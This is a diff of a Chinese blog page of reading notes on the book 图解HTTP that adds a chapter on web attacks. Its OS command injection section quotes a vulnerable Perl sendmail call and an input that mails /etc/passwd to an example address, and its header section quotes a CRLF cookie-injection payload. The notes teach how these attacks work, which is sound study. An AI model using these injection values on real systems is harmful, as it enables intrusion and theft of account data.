class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7.1.1-%E9%80%9A%E4%BF%A1%E4%BD%BF%E7%94%A8%E6%98%8E%E6%96%87%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E7%AA%83%E5%90%AC"><span class="toc-text">7.1.1 通信使用明文可能会被窃听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.1.2-%E4%B8%8D%E9%AA%8C%E8%AF%81%E9%80%9A%E4%BF%A1%E6%96%B9%E7%9A%84%E8%BA%AB%E4%BB%BD%E5%B0%B1%E5%8F%AF%E8%83%BD%E9%81%AD%E5%8F%97%E4%BC%AA%E8%A3%85"><span class="toc-text">7.1.2 不验证通信方的身份就可能遭受伪装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.1.3-%E6%97%A0%E6%B3%95%E8%AF%81%E6%98%8E%E6%8A%A5%E6%96%87%E7%9A%84%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%B7%B2%E9%81%AD%E7%AF%A1%E6%94%B9"><span class="toc-text">7.1.3 无法证明报文的完整性，可能已遭篡改</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7.2-http+%E5%8A%A0%E5%AF%86+%E8%AE%A4%E8%AF%81+%E5%AE%8C%E6%95%B4%E6%80%A7%E4%BF%9D%E6%8A%A4=https"><span class="toc-text">7.2 HTTP+加密+认证+完整性保护&#x3D;HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.2-https%E6%98%AF%E8%BA%AB%E6%8A%ABssl%E5%A4%96%E5%A3%B3%E7%9A%84http"><span class="toc-text">7.2.2 HTTPS是身披SSL外壳的HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.3-%E7%9B%B8%E4%BA%92%E4%BA%A4%E4%BA%92%E5%AF%86%E9%92%A5%E7%9A%84%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF"><span class="toc-text">7.2.3 相互交互密钥的公开密钥加密技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.4-%E8%AF%81%E6%98%8E%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-text">7.2.4 证明公开密钥正确的证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.5-https-%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6"><span class="toc-text">7.2.5 HTTPS 的安全通信机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E7%AB%A0-%E7%A1%AE%E8%AE%A4%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E5%9C%B0%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-text">第八章 确认访问用户地身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8.1-%E4%BD%95%E4%B8%BA%E8%AE%A4%E8%AF%81"><span class="toc-text">8.1 何为认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.2-basic%E8%AE%A4%E8%AF%81"><span class="toc-text">8.2 BASIC认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.3-digest%E8%AE%A4%E8%AF%81"><span class="toc-text">8.3 DIGEST认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.4-ssl%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81"><span class="toc-text">8.4 SSL客户端认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8.4.1-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%AD%A5%E9%AA%A4"><span class="toc-text">8.4.1 SSL 客户端认证的认证步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8.4.2-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E9%87%87%E7%94%A8%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81"><span class="toc-text">8.4.2　SSL 客户端认证采用双因素认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E5%BF%85%E8%A6%81%E7%9A%84%E8%B4%B9%E7%94%A8"><span class="toc-text">SSL 客户端认证必要的费用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.5-%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81"><span class="toc-text">8.5 基于表单认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8.5.1-%E8%AE%A4%E8%AF%81%E5%A4%9A%E5%8D%8A%E4%B8%BA%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81"><span class="toc-text">8.5.1　认证多半为基于表单认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8.5.2-session-%E7%AE%A1%E7%90%86%E5%8F%8A-cookie-%E5%BA%94%E7%94%A8"><span class="toc-text">8.5.2　Session 管理及 Cookie 应用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%BD%E5%8A%A0%E5%8D%8F%E8%AE%AE"><span class="toc-text">第九章 基于HTTP的功能追加协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9.1-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-text">9.1 基于HTTP的协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.2-%E6%B6%88%E9%99%A4http%E7%93%B6%E9%A2%88%E7%9A%84spdy"><span class="toc-text">9.2 消除HTTP瓶颈的SPDY</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9.2.1-http%E7%9A%84%E7%93%B6%E9%A2%88"><span class="toc-text">9.2.1 HTTP的瓶颈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9.2.2-spdy%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD"><span class="toc-text">9.2.2 SPDY的设计和功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9.2.3-spdy%E6%B6%88%E9%99%A4web%E7%93%B6%E9%A2%88%E4%BA%86%E5%90%97"><span class="toc-text">9.2.3 SPDY消除Web瓶颈了吗</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.3-%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%85%A8%E5%8F%8C%E5%B7%A5%E9%80%9A%E4%BF%A1%E7%9A%84websocket"><span class="toc-text">9.3 使用浏览器进行全双工通信的WebSocket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.4-http/2.0"><span class="toc-text">9.4 HTTP&#x2F;2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.5-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%E7%9A%84webdav"><span class="toc-text">9.5 Web服务器管理文件的WebDAV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E7%AB%A0-%E6%9E%84%E5%BB%BAweb%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF"><span class="toc-text">第十章 构建Web内容的技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#10.1-html"><span class="toc-text">10.1 HTML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10.2-%E5%8A%A8%E6%80%81html"><span class="toc-text">10.2 动态HTML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10.3-web%E5%BA%94%E7%94%A8"><span class="toc-text">10.3 Web应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10.4-%E6%95%B0%E6%8D%AE%E5%8F%91%E5%B8%83%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%92%8C%E8%AF%AD%E8%A8%80"><span class="toc-text">10.4 数据发布的格式和语言</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-text">第十一章 Web的攻击技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11.1-%E9%92%88%E5%AF%B9web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-text">11.1 针对Web的攻击技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11.2-%E5%9B%A0%E8%BE%93%E5%87%BA%E5%80%BC%E8%BD%AC%E4%B9%89%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">11.2 因输出值转义不完全引发的安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#11.2.1-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-text">11.2.1 跨站脚本攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11.2.2-sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">11.2.2 SQL注入攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11.2.3-os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">11.2.3 OS命令注入攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11.2.4-http%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">11.2.4 HTTP首部注入攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11.2.5-%E9%82%AE%E4%BB%B6%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">11.2.5 邮件首部注入攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11.2.6-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB"><span class="toc-text">11.2.6 目录遍历攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11.2.7-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">11.2.7 远程文件包含漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11.3-%E5%9B%A0%E8%AE%BE%E7%BD%AE%E6%88%96%E8%AE%BE%E8%AE%A1%E4%B8%8A%E7%9A%84%E7%BC%BA%E9%99%B7%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">11.3 因设置或设计上的缺陷引发的安全漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11.4-%E5%9B%A0%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E8%80%8C%E7%96%8F%E5%BF%BD%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">11.4 因会话管理而疏忽的安全漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11.5-%E5%85%B6%E5%AE%83%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">11.5 其它安全漏洞</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/web"><i class="tag post-item-tag">web</i></a><a href="/tags/HTTP"><i class="tag post-item-tag">HTTP</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">图解HTTP</h1><time class="has-text-grey" datetime="2023-06-18T08:09:17.551Z">2023-06-18</time><article class="mt-2 post-content"><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/x_x.jpg" alt></p>
 <p>本文章为阅读图解HTTP（上野宣）这一书籍的读书笔记</p>
 <h2 id="%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BA%86%E8%A7%A3web%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80" tabindex="-1">第一章 了解Web及网络基础</h2>
 <ul>
@@ -1399,7 +1399,7 @@ nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该
 <li>除创建删除文件等基本功能，还具备文件创建者管理，文件编辑过程中的加锁功能，以及文件内容修改的版本控制功能</li>
 </ul>
 <h2 id="%E7%AC%AC%E5%8D%81%E7%AB%A0-%E6%9E%84%E5%BB%BAweb%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF" tabindex="-1">第十章 构建Web内容的技术</h2>
-<h2 id="10.1-html" tabindex="-1">10.1 HTML</h2>
+<h3 id="10.1-html" tabindex="-1">10.1 HTML</h3>
 <ul>
 <li>Web页面几乎全由HTML构建
 <ul>
@@ -1416,7 +1416,7 @@ nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该
 </ul>
 </li>
 </ul>
-<h2 id="10.2-%E5%8A%A8%E6%80%81html" tabindex="-1">10.2 动态HTML</h2>
+<h3 id="10.2-%E5%8A%A8%E6%80%81html" tabindex="-1">10.2 动态HTML</h3>
 <ul>
 <li>
 <p>动态HTML：指使用客户端脚本语言将静态的HTML内容变成动态的技术总称。</p>
@@ -1431,7 +1431,7 @@ nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该
 <p>通过调用JavaScript等脚本对DOM操作，可以以更为简单的方式控制HTML</p>
 </li>
 </ul>
-<h2 id="10.3-web%E5%BA%94%E7%94%A8" tabindex="-1">10.3 Web应用</h2>
+<h3 id="10.3-web%E5%BA%94%E7%94%A8" tabindex="-1">10.3 Web应用</h3>
 <ul>
 <li>
 <p>通过Web提供功能的Web应用</p>
@@ -1457,7 +1457,7 @@ nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该
 </ul>
 </li>
 </ul>
-<h2 id="10.4-%E6%95%B0%E6%8D%AE%E5%8F%91%E5%B8%83%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%92%8C%E8%AF%AD%E8%A8%80" tabindex="-1">10.4 数据发布的格式和语言</h2>
+<h3 id="10.4-%E6%95%B0%E6%8D%AE%E5%8F%91%E5%B8%83%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%92%8C%E8%AF%AD%E8%A8%80" tabindex="-1">10.4 数据发布的格式和语言</h3>
 <ul>
 <li>
 <p>可扩展标记语言（XML eXtensible Markup Language）是一种可按应用目标进行扩展的通用标记语言。</p>
@@ -1512,11 +1512,230 @@ nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该
 <li>被动攻击：
 <ul>
 <li>指领用圈套策略执行攻击代码的攻击模式，此时攻击者不直接对目标Web应用访问发起攻击</li>
+<li>通常攻击模式如下<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_2.jpg" alt>
+<ul>
 <li>
-<h2 id="%E9%80%9A%E5%B8%B8%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F%E5%A6%82%E4%B8%8B" tabindex="-1">通常攻击模式如下<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_2.jpg" alt></h2>
+<ol>
+<li>攻击者诱使用户出发已设置好的陷阱，而陷阱会启动发送已经嵌入攻击代码的HTTP请求</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>当用户不知不觉中中招之后，用户的浏览器或邮件客户端会触发这个陷阱</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用，进行代码攻击</li>
+</ol>
+</li>
+<li>
+<ol start="4">
+<li>执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果</li>
+</ol>
 </li>
 </ul>
 </li>
+<li>代表：跨站脚本攻击和跨站请求伪造</li>
+<li>利用被动攻击，可以对原本无法从互联网上访问到的企业内网等网络发起攻击<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_3.jpg" alt></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="11.2-%E5%9B%A0%E8%BE%93%E5%87%BA%E5%80%BC%E8%BD%AC%E4%B9%89%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.2 因输出值转义不完全引发的安全漏洞</h3>
+<ul>
+<li>实施Web应用的安全对策可大致分为以下两部分<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_4.jpg" alt>
+<ul>
+<li>客户端的验证
+<ul>
+<li>可以使用JS在客户端验证数据，但可能发生数据篡改数据或关闭JS，因此JS验证不适合作为安全防范对策</li>
+<li>保留客户端验证可以尽可能早的识别出输入错误，提高UI体验</li>
+</ul>
+</li>
+<li>Web应用端的验证
+<ul>
+<li>输入值验证：检查是否符合系统业务逻辑的数值或检查字符编码等预防对策</li>
+<li>输出值转义：当输出值转义出现问题，可能会触发攻击者传入的攻击代码</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="11.2.1-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB" tabindex="-1">11.2.1 跨站脚本攻击</h4>
+<ul>
+<li>
+<p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript进行的一种攻击。</p>
+</li>
+<li>
+<p>可能造成的影响</p>
+<ul>
+<li>利用虚假输入表单骗取用户个人信息</li>
+<li>利用脚本窃取用户Cookie值，被害者不知情的情况下，帮助攻击者发送恶意请求</li>
+<li>显示伪造的图片或文章</li>
+</ul>
+</li>
+<li>
+<p>跨站脚本攻击案例<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_5.jpg" alt></p>
+</li>
+<li>
+<p>XSS是攻击者利用预先设置的陷阱触发的被动攻击</p>
+</li>
+</ul>
+<h4 id="11.2.2-sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.2 SQL注入攻击</h4>
+<ul>
+<li>SQL注入是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。该安全隐患有可能引发极大威胁，引起机密信息丢失</li>
+<li>SQL是用来操作关系型数据库管理系统的数据库语言</li>
+<li><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_6.jpg" alt></li>
+</ul>
+<h4 id="11.2.3-os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.3 OS命令注入攻击</h4>
+<ul>
+<li>OS命令注入攻击：通过Web应用执行非法的操作系统命令达到攻击的谜底，只要在能调用shell函数的地方就有可能存在攻击</li>
+</ul>
+<pre><code class="language-cmd">my $adr = $q-&gt;param('mailaddress');
+open(MAIL, &quot;¦ /usr/sbin/sendmail $adr&quot;);
+print MAIL &quot;From: info@example.com\n&quot;;
+</code></pre>
+<p>如果攻击者将以下值作为邮件地址</p>
+<pre><code class="language-cmd">; cat /etc/passwd ¦ mail hack@example.jp
+</code></pre>
+<p>程序接收该值，构成以下的命令组合。</p>
+<pre><code class="language-cmd">¦ /usr/sbin/sendmail ; cat /etc/passwd ¦ mail hack@example.jp
+</code></pre>
+<p>攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。<br>
+可见，sendmail 命令执行被分隔后，接下去就会执行 cat /etc/passwd | mail <a href="mailto:hack@example.jp">hack@example.jp</a> 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 <a href="mailto:hack@example.jp">hack@example.jp</a>。</p>
+<h4 id="11.2.4-http%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.4 HTTP首部注入攻击</h4>
+<ul>
+<li>
+<p>指攻击者在响应首部字段插入换行，添加任意响应首部或主体的一种攻击，属于被动攻击。</p>
+</li>
+<li>
+<p>案例：</p>
+<ul>
+<li>形如：Location: <a href="http://example.com/?cat=101">http://example.com/?cat=101</a></li>
+<li>攻击者用<code>101%0D%0ASet-Cookie:+SID=123456789</code>替代101</li>
+<li>其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（<a target="_blank" rel="noopener" href="http://hackr.jp/%EF%BC%89%E7%9A%84%E4%BC%9A%E8%AF%9D">http://hackr.jp/）的会话</a> ID 设置成 SID=123456789 的Set-Cookie 首部字段</li>
+<li>当结果返回</li>
+</ul>
+<pre><code>Location: http://example.com/?cat=101（%0D%0A ：换行符）
+Set-Cookie: SID=123456789
+</code></pre>
+<ul>
+<li>此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户</li>
+</ul>
+</li>
+<li>
+<p>HTTP响应截断攻击：HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。</p>
+</li>
+</ul>
+<h4 id="11.2.5-%E9%82%AE%E4%BB%B6%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.5 邮件首部注入攻击</h4>
+<p>邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。</p>
+<h4 id="11.2.6-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB" tabindex="-1">11.2.6 目录遍历攻击</h4>
+<p>目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。</p>
+<h4 id="11.2.7-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E" tabindex="-1">11.2.7 远程文件包含漏洞</h4>
+<p>远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。</p>
+<h3 id="11.3-%E5%9B%A0%E8%AE%BE%E7%BD%AE%E6%88%96%E8%AE%BE%E8%AE%A1%E4%B8%8A%E7%9A%84%E7%BC%BA%E9%99%B7%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.3 因设置或设计上的缺陷引发的安全漏洞</h3>
+<ul>
+<li>
+<p>强制浏览：从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件</p>
+<ul>
+<li>对不公开的文件，为了安全会隐蔽其URL，但一旦知道了URL，便可以通过URL浏览对应的文件，而URL很有可能泄露
+<ul>
+<li>文件目录一览</li>
+<li>容易被推测的文件名和目录名</li>
+<li>备份文件：备份文件无执行权限，可能以源代码形式显示</li>
+<li>经认证才能显示的文件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>不正确的错误处理</p>
+<ul>
+<li>与Web应用有关的错误信息
+<ul>
+<li>Web应用抛出的错误信息：提示消息会暴露一些信息</li>
+<li>数据库等系统抛出的错误信息：会给攻击者以启发</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>开放重定向：是一种对指定的任意 URL 作重定向跳转的功能</p>
+<ul>
+<li>漏洞：假如指定的重定向URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web网站</li>
+</ul>
+</li>
+</ul>
+<h3 id="11.4-%E5%9B%A0%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E8%80%8C%E7%96%8F%E5%BF%BD%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.4 因会话管理而疏忽的安全漏洞</h3>
+<ul>
+<li>
+<p>会话劫持：指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p>
+<ul>
+<li>具备认证功能的Web应用，使用会话ID的会话管理机制。会话ID中记录客户端的Cookie信息，服务端将 会话ID与认证状态进行一对一匹配管理</li>
+<li>可获得会话ID的途径
+<ul>
+<li>通过非珍贵的生成方法推测会话ID</li>
+<li>通过窃听或XSS攻击盗取会话ID</li>
+<li>通过会话固定攻击（Session Fixation）强行获取会话ID</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>会话固定攻击：强制用户使用攻击者指定的会话ID，属于被动攻击</p>
+</li>
+<li>
+<p>跨站点请求伪造：指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击</p>
+</li>
+</ul>
+<h3 id="11.5-%E5%85%B6%E5%AE%83%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.5 其它安全漏洞</h3>
+<ul>
+<li>
+<p>密码破解：密码破解攻击（Password Cracking）即算出密码，突破认证。</p>
+<ul>
+<li>手段
+<ul>
+<li>通过网络的密码试错
+<ul>
+<li>穷举法</li>
+<li>字典攻击：收集好候选密码组成字典，枚举字典</li>
+</ul>
+</li>
+<li>对已经加密的密码的破解
+<ul>
+<li>通过穷举法·字典攻击进行类推</li>
+<li>彩虹表：是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举法 • 字典攻击等实际破解过程中缩短消耗时间的技巧</li>
+<li>拿到密钥</li>
+<li>加密算法的漏洞</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>点击劫持：指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p>
+</li>
+<li>
+<p>Dos攻击（Denial of Service attack）</p>
+<ul>
+<li>是一种让运行中的服务呈停止状态的攻击，也叫做服务停止攻击或拒绝服务攻击。</li>
+<li>两种Dos攻击方式
+<ul>
+<li>集中利用访问请求造成资源过载，资源耗尽的同时实际上服务也呈停止状态</li>
+<li>通过攻击安全漏洞使服务停止</li>
+</ul>
+</li>
+<li>多台计算机发起的Dos攻击称为DDOS（Distributed DOS）</li>
+</ul>
+</li>
+<li>
+<p>后门程序：是指开发设置的隐藏入口，可不按正常步骤使用受限功能</p>
+<ul>
+<li>开发阶段作为 Debug 调用的后门程序</li>
+<li>开发者为了自身利益植入的后门程序</li>
+<li>攻击者通过某种方法设置的后门程序</li>
 </ul>
 </li>
 </ul>
